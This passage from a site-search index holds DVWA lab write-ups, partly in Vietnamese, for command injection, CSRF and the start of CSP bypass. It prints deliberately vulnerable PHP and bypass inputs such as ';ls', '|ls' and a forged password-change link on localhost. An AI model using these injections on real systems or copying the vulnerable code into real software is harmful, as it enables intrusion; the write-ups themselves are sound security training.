h\u01a1n cho vi\u1ec7c filter c\u1ee7a LFI ( ../ ) Exploition \u00b6 \u0110\u00e2y l\u00e0 th\u00e0nh qu\u1ea3 cho vi\u1ec7c b\u1ea1n t\u00ecm ra \u0111i\u1ec1u b\u1ea5t ng\u1edd tr\u00ean What we learned \u00b6 Trick bypass Blacklist simple Security Level: Impossible \u00b6 Source code vulnerabilities/exec/source/impossible.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST [ 'ip' ]; $target = stripslashes ( $target ); // Split the IP into 4 octects $octet = explode ( \".\" , $target ); // Check IF each octet is an integer if ( ( is_numeric ( $octet [ 0 ] ) ) && ( is_numeric ( $octet [ 1 ] ) ) && ( is_numeric ( $octet [ 2 ] ) ) && ( is_numeric ( $octet [ 3 ] ) ) && ( sizeof ( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet [ 0 ] . '.' . $octet [ 1 ] . '.' . $octet [ 2 ] . '.' . $octet [ 3 ]; // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } else { // Ops. Let the user name theres a mistake echo '<pre>ERROR: You have entered an invalid IP.</pre>' ; } } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 M\u1ee9c \u0111\u1ed9 n\u00e0y th\u00ec thua r\u1ed3i, h\u1ecd t\u00e1ch ra t\u1eebng octet m\u1ed9t c\u1ee7a IP v\u00e0 check qu\u00e1 ch\u1eb7t ch\u1ebd. H\u1ecd c\u00f2n lo t\u1edbi vi\u1ec7c check token user n\u1eefa m\u00e0. \u1ede \u0111\u00e2y t\u00f4i mu\u1ed1n n\u00f3i th\u00eam v\u1ec1 blacklist v\u00e0 whitelist: Blacklist \u0111\u01b0\u1ee3c hi\u1ec3u l\u00e0 danh s\u00e1ch \u0111en, t\u1ee9c s\u1ebd ch\u1eb7n nh\u1eefng th\u1ee9 c\u00f3 trong \u0111\u00f3. V\u00ed d\u1ee5 nh\u01b0 ta bi\u1ebft 1 danh s\u00e1ch t\u1ea7m 10 s\u1ed1 \u0111i\u1ec7n tho\u1ea1i spam, ta cho n\u00f3 v\u00e0o danh s\u00e1ch \u0111en. C\u00e2u h\u1ecfi \u0111\u01b0\u1ee3c \u0111\u1eb7t ra l\u00e0 n\u1ebfu ta bi\u1ebft th\u00eam 10, 20, ..., 100, ... s\u1ed1 \u0111i\u1ec7n tho\u1ea1i spam n\u1eefa th\u00ec sao? Danh s\u00e1ch \u0111en n\u00e0o cho \u0111\u1ee7? Whitelist l\u00e0 danh s\u00e1ch tr\u1eafng, t\u1ee9c ch\u1ec9 cho ph\u00e9p nh\u1eefng th\u1ee9 c\u00f3 trong \u0111\u00f3. \u0110i\u1ec1u n\u00e0y \u0111\u01a1n gi\u1ea3n h\u01a1n nhi\u1ec1u. Ta kh\u00f4ng c\u1ea7n bi\u1ebft s\u1ed1 l\u01b0\u1ee3ng s\u1ed1 \u0111i\u1ec7n tho\u1ea1i spam, ta ch\u1ec9 c\u1ea7n bi\u1ebft s\u1ed1 l\u01b0\u1ee3ng s\u1ed1 \u0111i\u1ec7n tho\u1ea1i ng\u01b0\u1eddi quen c\u1ee7a ta v\u00e0 b\u1ecf v\u00e0o whitelist. \u0110i\u1ec1u n\u00e0y \u0111\u01a1n gi\u1ea3n h\u01a1n \u0111\u00fang kh\u00f4ng? Th\u00f4ng th\u01b0\u1eddng, h\u1ecd s\u1ebd d\u00f9ng whitelist thay cho blacklist v\u00ec whitelist ph\u1ea7n l\u1edbn lu\u00f4n \u00edt d\u1eef li\u1ec7u h\u01a1n blacklist d\u1eabn \u0111\u1ebfn vi\u1ec7c d\u1ec5 ki\u1ec3m so\u00e1t. More Information \u00b6 https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution http://www.ss64.com/bash/ http://www.ss64.com/nt/ https://owasp.org/www-community/attacks/Command_Injection","title":"Command Injection"},{"location":"dvwa/command-injection/#command-injection","text":"Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. This attack differs from Code Injection , in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.","title":"Command Injection"},{"location":"dvwa/command-injection/#security-level-low","text":"Source code vulnerabilities/exec/source/low.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $target = $_REQUEST [ 'ip' ]; // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } ?>","title":"Security Level: Low"},{"location":"dvwa/command-injection/#analysis","text":"Nh\u00ecn source code tr\u00ean, d\u1ec5 d\u00e0ng th\u1ea5y \u0111\u01b0\u1ee3c target c\u1ee7a ta l\u00e0 th\u1ef1c thi th\u1ee9 g\u00ec \u0111\u00f3 t\u1ea1i shell kh\u00f4ng ch\u1ec9 m\u1ed7i vi\u1ec7c ping IP (c\u00f3 th\u1ec3 m\u1edf reverse shell, ...) Ta th\u1ea5y r\u1eb1ng \u1edf \u0111o\u1ea1n code tr\u00ean kh\u00f4ng h\u1ec1 c\u00f3 vi\u1ec7c filter \u0111\u1ea7u v\u00e0o c\u00f3 ph\u1ea3i l\u00e0 IP hay kh\u00f4ng, v\u00ec \u0111i\u1ec1u n\u00e0y, ta c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng bypass b\u1eb1ng vi\u1ec7c nh\u1eadp m\u1ed9t d\u00e3y l\u1ec7nh (ng\u0103n c\u00e1ch v\u1edbi nhau b\u1eb1ng d\u1ea5u ch\u1ea5m ph\u1ea9y \u0111\u1ec3 th\u1ec3 hi\u1ec7n t\u1eebng l\u1ec7nh) nh\u01b0 10.10.10.10;ls,... hay c\u01a1 b\u1ea3n h\u01a1n l\u00e0 ;ls l\u00e0 c\u00f3 th\u1ec3 bypass \u0111\u01b0\u1ee3c challenge","title":"Analysis"},{"location":"dvwa/command-injection/#exploition","text":"Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch \u1edf tr\u00ean, ta s\u1ebd bypass challenge b\u1eb1ng vi\u1ec7c ti\u00eam l\u1ec7nh ls N\u00e2ng cao h\u01a1n, ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng tr\u00ecnh nghe netcat \u0111\u1ec3 k\u1ebft n\u1ed1i v\u1edbi m\u00e1y kh\u00e1c.","title":"Exploition"},{"location":"dvwa/command-injection/#what-we-learned","text":"Read code","title":"What we learned"},{"location":"dvwa/command-injection/#security-level-medium","text":"Source code vulnerabilities/exec/source/medium.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $target = $_REQUEST [ 'ip' ]; // Set blacklist $substitutions = array ( '&&' => '' , ';' => '' , ); // Remove any of the characters in the array (blacklist). $target = str_replace ( array_keys ( $substitutions ), $substitutions , $target ); // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } ?>","title":"Security Level: Medium"},{"location":"dvwa/command-injection/#analysis_1","text":"Challenge n\u00e0y th\u1eed th\u00e1ch h\u01a1n m\u1ed9t ch\u00fat v\u00ec h\u1ecb d\u00f9ng blacklist \u0111\u1ec3 filter to\u00e1n t\u1eed && v\u00e0 ; . Nh\u01b0ng blacklist n\u00e0y ch\u1eafc ch\u1eafn l\u00e0 ch\u01b0a \u0111\u1ee7, c\u00f2n nhi\u1ec1u lo\u1ea1i to\u00e1n t\u1eed trong linux gi\u00fap \u00edch cho vi\u1ec7c th\u1ef1c thi l\u1ec7nh n\u1eefa c\u01a1. Xem th\u00eam c\u00e1c to\u00e1n t\u1eed trong linux t\u1ea1i https://www.makeuseof.com/linux-command-line-chaining-operators/ Ho\u1eb7c xem b\u1ea3ng t\u1ed5ng h\u1ee3p b\u00ean d\u01b0\u1edbi Name Description The Ampersand Operator ( & ) Run linux command in background The Semicolon Operator ( ; ) Execute commands in a defined, sequential order The OR Operator ( || ) Execute the command that follows only if the preceding command fails The Pipe Operator ( | ) The pipe operator directs the output of the preceding command as input to the succeeding command The AND Operator ( && ) Execute commands only if the preceding command was successfully executed The NOT Operator ( ! ) The NOT operator works in similar ways to an except statement in programming The Precedence Operator ( (...) ) Visit here The Combination Operator ( {...} ) Group commands Concatenation or the Escape Operator ( \\ ) Visit here The Redirection Operators ( > , >> , < ) Visit here","title":"Analysis"},{"location":"dvwa/command-injection/#exploition_1","text":"Quay tr\u1edf l\u1ea1i challenge, ta d\u1ec5 d\u00e0ng c\u00f3 th\u1ec3 t\u1ea1o 1 l\u1ec7nh cho n\u00f3 ch\u1ea1y background nh\u01b0 h\u00ecnh d\u01b0\u1edbi. &ls -la source","title":"Exploition"},{"location":"dvwa/command-injection/#what-we-learned_1","text":"Blacklist","title":"What we learned"},{"location":"dvwa/command-injection/#security-level-high","text":"Source code vulnerabilities/exec/source/high.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $target = trim ( $_REQUEST [ 'ip' ]); // Set blacklist $substitutions = array ( '&' => '' , ';' => '' , '| ' => '' , '-' => '' , '$' => '' , '(' => '' , ')' => '' , '`' => '' , '||' => '' , ); // Remove any of the characters in the array (blacklist). $target = str_replace ( array_keys ( $substitutions ), $substitutions , $target ); // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } ?>","title":"Security Level: High"},{"location":"dvwa/command-injection/#analysis_2","text":"L\u1ea1i l\u00e0 blacklist, nh\u01b0ng l\u1ea7n n\u00e0y ta th\u1ea5y \u0111\u1ea5y. H\u1ecd filter h\u1ebft to\u00e0n b\u1ed9 to\u00e1n t\u1eed n\u1eb1m trong ph\u1ea7n Security Level: Medium :3 Ch\u00fa \u00fd thi\u1ec7t k\u0129 blacklist, b\u1ea1n s\u1ebd nh\u1eadn ra \u0111i\u1ec1u b\u1ea5t ng\u1edd Hint B\u1ea1n c\u00f3 \u0111\u1ec3 \u00fd filter to\u00e1n t\u1eed pipe kh\u00f4ng, n\u00f3 c\u00f3 kho\u1ea3ng tr\u1eafng ph\u00eda sau \u0111\u1ea5y. T\u1ee9c l\u00e0 n\u00f3 filter | ch\u1ee9 kh\u00f4ng ph\u1ea3i filter | . Hay n\u00f3i c\u00e1ch kh\u00e1c, d\u00f9ng |ls s\u1ebd th\u1ef1c thi th\u00e0nh c\u00f4ng l\u1ec7nh. L\u1ec7nh trim() c\u0169ng g\u00f3p ph\u1ea7n nh\u1ecf trong vi\u1ec7c filter n\u00e0y, v\u00ec l\u1ec7nh trim() ch\u1ec9 x\u00f3a kho\u1ea3ng tr\u1eafng \u1edf \u0111\u1ea7u/cu\u1ed1i chu\u1ed7i. Vi\u1ec7c nh\u1eadp kho\u1ea3ng tr\u1eafng \u1edf \u0111o\u1ea1n gi\u1eefa, th\u00ec h\u00e0m trim() s\u1ebd kh\u00f4ng filter \u0111\u01b0\u1ee3c. H\u01a1n n\u1eefa, c\u00f3 m\u1ed9t \u00fd n\u00e2ng cao trong n\u00e0y, v\u00ec blacklist n\u00f3 ch\u1ec9 \u0111\u1ecdc v\u00e0 filter | n\u00ean ta c\u00f3 th\u1ec3 bypass b\u1eb1ng | | . T\u1ee9c n\u00f3 x\u00f3a \u0111i |<kho\u1ea3ng tr\u1eafng> v\u00e0 c\u00f2n l\u1ea1i | . \u0110\u00e2y c\u0169ng l\u00e0 m\u1ed9t ph\u1ea7n ph\u1ea3i ch\u00fa \u00fd. M\u1edf r\u1ed9ng h\u01a1n cho vi\u1ec7c filter c\u1ee7a LFI ( ../ )","title":"Analysis"},{"location":"dvwa/command-injection/#exploition_2","text":"\u0110\u00e2y l\u00e0 th\u00e0nh qu\u1ea3 cho vi\u1ec7c b\u1ea1n t\u00ecm ra \u0111i\u1ec1u b\u1ea5t ng\u1edd tr\u00ean","title":"Exploition"},{"location":"dvwa/command-injection/#what-we-learned_2","text":"Trick bypass Blacklist simple","title":"What we learned"},{"location":"dvwa/command-injection/#security-level-impossible","text":"Source code vulnerabilities/exec/source/impossible.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST [ 'ip' ]; $target = stripslashes ( $target ); // Split the IP into 4 octects $octet = explode ( \".\" , $target ); // Check IF each octet is an integer if ( ( is_numeric ( $octet [ 0 ] ) ) && ( is_numeric ( $octet [ 1 ] ) ) && ( is_numeric ( $octet [ 2 ] ) ) && ( is_numeric ( $octet [ 3 ] ) ) && ( sizeof ( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet [ 0 ] . '.' . $octet [ 1 ] . '.' . $octet [ 2 ] . '.' . $octet [ 3 ]; // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } else { // Ops. Let the user name theres a mistake echo '<pre>ERROR: You have entered an invalid IP.</pre>' ; } } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: Impossible"},{"location":"dvwa/command-injection/#analysis_3","text":"M\u1ee9c \u0111\u1ed9 n\u00e0y th\u00ec thua r\u1ed3i, h\u1ecd t\u00e1ch ra t\u1eebng octet m\u1ed9t c\u1ee7a IP v\u00e0 check qu\u00e1 ch\u1eb7t ch\u1ebd. H\u1ecd c\u00f2n lo t\u1edbi vi\u1ec7c check token user n\u1eefa m\u00e0. \u1ede \u0111\u00e2y t\u00f4i mu\u1ed1n n\u00f3i th\u00eam v\u1ec1 blacklist v\u00e0 whitelist: Blacklist \u0111\u01b0\u1ee3c hi\u1ec3u l\u00e0 danh s\u00e1ch \u0111en, t\u1ee9c s\u1ebd ch\u1eb7n nh\u1eefng th\u1ee9 c\u00f3 trong \u0111\u00f3. V\u00ed d\u1ee5 nh\u01b0 ta bi\u1ebft 1 danh s\u00e1ch t\u1ea7m 10 s\u1ed1 \u0111i\u1ec7n tho\u1ea1i spam, ta cho n\u00f3 v\u00e0o danh s\u00e1ch \u0111en. C\u00e2u h\u1ecfi \u0111\u01b0\u1ee3c \u0111\u1eb7t ra l\u00e0 n\u1ebfu ta bi\u1ebft th\u00eam 10, 20, ..., 100, ... s\u1ed1 \u0111i\u1ec7n tho\u1ea1i spam n\u1eefa th\u00ec sao? Danh s\u00e1ch \u0111en n\u00e0o cho \u0111\u1ee7? Whitelist l\u00e0 danh s\u00e1ch tr\u1eafng, t\u1ee9c ch\u1ec9 cho ph\u00e9p nh\u1eefng th\u1ee9 c\u00f3 trong \u0111\u00f3. \u0110i\u1ec1u n\u00e0y \u0111\u01a1n gi\u1ea3n h\u01a1n nhi\u1ec1u. Ta kh\u00f4ng c\u1ea7n bi\u1ebft s\u1ed1 l\u01b0\u1ee3ng s\u1ed1 \u0111i\u1ec7n tho\u1ea1i spam, ta ch\u1ec9 c\u1ea7n bi\u1ebft s\u1ed1 l\u01b0\u1ee3ng s\u1ed1 \u0111i\u1ec7n tho\u1ea1i ng\u01b0\u1eddi quen c\u1ee7a ta v\u00e0 b\u1ecf v\u00e0o whitelist. \u0110i\u1ec1u n\u00e0y \u0111\u01a1n gi\u1ea3n h\u01a1n \u0111\u00fang kh\u00f4ng? Th\u00f4ng th\u01b0\u1eddng, h\u1ecd s\u1ebd d\u00f9ng whitelist thay cho blacklist v\u00ec whitelist ph\u1ea7n l\u1edbn lu\u00f4n \u00edt d\u1eef li\u1ec7u h\u01a1n blacklist d\u1eabn \u0111\u1ebfn vi\u1ec7c d\u1ec5 ki\u1ec3m so\u00e1t.","title":"Analysis"},{"location":"dvwa/command-injection/#more-information","text":"https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution http://www.ss64.com/bash/ http://www.ss64.com/nt/ https://owasp.org/www-community/attacks/Command_Injection","title":"More Information"},{"location":"dvwa/cross-site-request-forgery/","tags":["DVWA","CSRF"],"text":"Cross Site Request Forgery \u00b6 Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they\u2019re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker\u2019s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. Objective \u00b6 Your task is to make the current user change their own password, without them knowing about their actions, using a CSRF attack. T\u00f3m l\u1ea1i, m\u1ee5c \u0111\u00edch c\u1ee7a ta l\u00e0 t\u1ea1o \u0111\u01b0\u1ee3c link \u0111\u1ec3 ng\u01b0\u1eddi d\u00f9ng click v\u00e0o. Security Level: Low \u00b6 Source code vulnerabilities/csrf/source/low.php <?php if ( isset ( $_GET [ 'Change' ] ) ) { // Get input $pass_new = $_GET [ 'password_new' ]; $pass_conf = $_GET [ 'password_conf' ]; // Do the passwords match? if ( $pass_new == $pass_conf ) { // They do! $pass_new = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass_new ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass_new = md5 ( $pass_new ); // Update the database $current_user = dvwaCurrentUser (); $insert = \"UPDATE `users` SET password = ' $pass_new ' WHERE user = '\" . $current_user . \"';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $insert ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\" ; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?> Analysis and exploition \u00b6 Challenge n\u00e0y h\u1ecd kh\u00f4ng filter \u0111\u1ea7u v\u00e0o. Quan tr\u1ecdng h\u01a1n vi\u1ec7c \u0111\u1ed5i password kh\u00f4ng c\u00f3 1 c\u01a1 ch\u1ebf x\u00e1c th\u1ef1c n\u00e0o c\u1ea3. Xem h\u00ecnh tr\u00ean ta c\u00f3 th\u1ec3 th\u1ea5y ta \u0111\u00e3 nh\u1eadp \u0111\u1ea1i m\u1ed9t password l\u00e0 pass v\u00e0 khi ta th\u1eed account admin v\u1edbi password m\u1edbi. Ta login th\u00e0nh c\u00f4ng (xem h\u00ecnh b\u00ean d\u01b0\u1edbi) H\u01a1n n\u1eefa, ta th\u1ea5y tr\u00ean url c\u1ee7a ph\u1ea7n thay \u0111\u1ed5i password ch\u1ec9 l\u00e0 GET thu\u1ea7n v\u00e0 ho\u00e0n to\u00e0n kh\u00f4ng c\u00f3 c\u01a1 ch\u1ebf m\u00e3 h\u00f3a n\u00e0o c\u1ea3. http://localhost:4280/vulnerabilities/csrf/?password_new=pass&password_conf=pass&Change=Change# Do \u0111\u00f3, th\u1ef1c t\u1ebf l\u00e0 ta s\u1ebd l\u00e0m cho ng\u01b0\u1eddi d\u00f9ng click v\u00e0o link \u0111\u00f3, l\u00e0m cho h\u1ecd \u0111\u1ed5i t\u00e0i kho\u1ea3n c\u1ee7a h\u1ecd m\u00e0 b\u1ea3n th\u00e2n h\u1ecd kh\u00f4ng bi\u1ebft. Security Level: Medium \u00b6 Source code vulnerabilities/csrf/source/medium.php <?php if ( isset ( $_GET [ 'Change' ] ) ) { // Checks to see where the request came from if ( stripos ( $_SERVER [ 'HTTP_REFERER' ] , $_SERVER [ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET [ 'password_new' ]; $pass_conf = $_GET [ 'password_conf' ]; // Do the passwords match? if ( $pass_new == $pass_conf ) { // They do! $pass_new = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass_new ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass_new = md5 ( $pass_new ); // Update the database $current_user = dvwaCurrentUser (); $insert = \"UPDATE `users` SET password = ' $pass_new ' WHERE user = '\" . $current_user . \"';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $insert ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\" ; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\" ; } } else { // Didn't come from a trusted source echo \"<pre>That request didn't look correct.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?> Analysis \u00b6 Exploition \u00b6 Security Level: High \u00b6 Source code Analysis \u00b6 Exploition \u00b6 Security Level: Impossible \u00b6 Source code Analysis \u00b6 Exploition \u00b6 What we learned \u00b6 More Information \u00b6 https://owasp.org/www-community/attacks/csrf http://www.cgisecurity.com/csrf-faq.html https://en.wikipedia.org/wiki/Cross-site_request_forgery","title":"Cross Site Request Forgery"},{"location":"dvwa/cross-site-request-forgery/#cross-site-request-forgery","text":"Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they\u2019re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker\u2019s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.","title":"Cross Site Request Forgery"},{"location":"dvwa/cross-site-request-forgery/#objective","text":"Your task is to make the current user change their own password, without them knowing about their actions, using a CSRF attack. T\u00f3m l\u1ea1i, m\u1ee5c \u0111\u00edch c\u1ee7a ta l\u00e0 t\u1ea1o \u0111\u01b0\u1ee3c link \u0111\u1ec3 ng\u01b0\u1eddi d\u00f9ng click v\u00e0o.","title":"Objective"},{"location":"dvwa/cross-site-request-forgery/#security-level-low","text":"Source code vulnerabilities/csrf/source/low.php <?php if ( isset ( $_GET [ 'Change' ] ) ) { // Get input $pass_new = $_GET [ 'password_new' ]; $pass_conf = $_GET [ 'password_conf' ]; // Do the passwords match? if ( $pass_new == $pass_conf ) { // They do! $pass_new = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass_new ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass_new = md5 ( $pass_new ); // Update the database $current_user = dvwaCurrentUser (); $insert = \"UPDATE `users` SET password = ' $pass_new ' WHERE user = '\" . $current_user . \"';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $insert ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\" ; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?>","title":"Security Level: Low"},{"location":"dvwa/cross-site-request-forgery/#analysis-and-exploition","text":"Challenge n\u00e0y h\u1ecd kh\u00f4ng filter \u0111\u1ea7u v\u00e0o. Quan tr\u1ecdng h\u01a1n vi\u1ec7c \u0111\u1ed5i password kh\u00f4ng c\u00f3 1 c\u01a1 ch\u1ebf x\u00e1c th\u1ef1c n\u00e0o c\u1ea3. Xem h\u00ecnh tr\u00ean ta c\u00f3 th\u1ec3 th\u1ea5y ta \u0111\u00e3 nh\u1eadp \u0111\u1ea1i m\u1ed9t password l\u00e0 pass v\u00e0 khi ta th\u1eed account admin v\u1edbi password m\u1edbi. Ta login th\u00e0nh c\u00f4ng (xem h\u00ecnh b\u00ean d\u01b0\u1edbi) H\u01a1n n\u1eefa, ta th\u1ea5y tr\u00ean url c\u1ee7a ph\u1ea7n thay \u0111\u1ed5i password ch\u1ec9 l\u00e0 GET thu\u1ea7n v\u00e0 ho\u00e0n to\u00e0n kh\u00f4ng c\u00f3 c\u01a1 ch\u1ebf m\u00e3 h\u00f3a n\u00e0o c\u1ea3. http://localhost:4280/vulnerabilities/csrf/?password_new=pass&password_conf=pass&Change=Change# Do \u0111\u00f3, th\u1ef1c t\u1ebf l\u00e0 ta s\u1ebd l\u00e0m cho ng\u01b0\u1eddi d\u00f9ng click v\u00e0o link \u0111\u00f3, l\u00e0m cho h\u1ecd \u0111\u1ed5i t\u00e0i kho\u1ea3n c\u1ee7a h\u1ecd m\u00e0 b\u1ea3n th\u00e2n h\u1ecd kh\u00f4ng bi\u1ebft.","title":"Analysis and exploition"},{"location":"dvwa/cross-site-request-forgery/#security-level-medium","text":"Source code vulnerabilities/csrf/source/medium.php <?php if ( isset ( $_GET [ 'Change' ] ) ) { // Checks to see where the request came from if ( stripos ( $_SERVER [ 'HTTP_REFERER' ] , $_SERVER [ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET [ 'password_new' ]; $pass_conf = $_GET [ 'password_conf' ]; // Do the passwords match? if ( $pass_new == $pass_conf ) { // They do! $pass_new = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass_new ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass_new = md5 ( $pass_new ); // Update the database $current_user = dvwaCurrentUser (); $insert = \"UPDATE `users` SET password = ' $pass_new ' WHERE user = '\" . $current_user . \"';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $insert ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\" ; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\" ; } } else { // Didn't come from a trusted source echo \"<pre>That request didn't look correct.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?>","title":"Security Level: Medium"},{"location":"dvwa/cross-site-request-forgery/#analysis","text":"","title":"Analysis"},{"location":"dvwa/cross-site-request-forgery/#exploition","text":"","title":"Exploition"},{"location":"dvwa/cross-site-request-forgery/#security-level-high","text":"Source code","title":"Security Level: High"},{"location":"dvwa/cross-site-request-forgery/#analysis_1","text":"","title":"Analysis"},{"location":"dvwa/cross-site-request-forgery/#exploition_1","text":"","title":"Exploition"},{"location":"dvwa/cross-site-request-forgery/#security-level-impossible","text":"Source code","title":"Security Level: Impossible"},{"location":"dvwa/cross-site-request-forgery/#analysis_2","text":"","title":"Analysis"},{"location":"dvwa/cross-site-request-forgery/#exploition_2","text":"","title":"Exploition"},{"location":"dvwa/cross-site-request-forgery/#what-we-learned","text":"","title":"What we learned"},{"location":"dvwa/cross-site-request-forgery/#more-information","text":"https://owasp.org/www-community/attacks/csrf http://www.cgisecurity.com/csrf-faq.html https://en.wikipedia.org/wiki/Cross-site_request_forgery","title":"More Information"},{"location":"dvwa/csp-bypass/","tags":["DVWA","CSP"],"text":"CSP Bypass \u00b6 About \u00b6 Content Security Policy (CSP) is used to define where scripts and other resources can be loaded or executed from. This module will walk you through ways to bypass the policy based on common mistakes made by developers. None of the vulnerabilities are actual vulnerabilities in CSP, they are vulnerabilities in the way it has been implemented. Objective \u00b6 Bypass Content Security Policy (CSP) and execute JavaScript in the page. Security Level: Low \u00b6 Source code vulnerabilities/csp/source/low.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self' 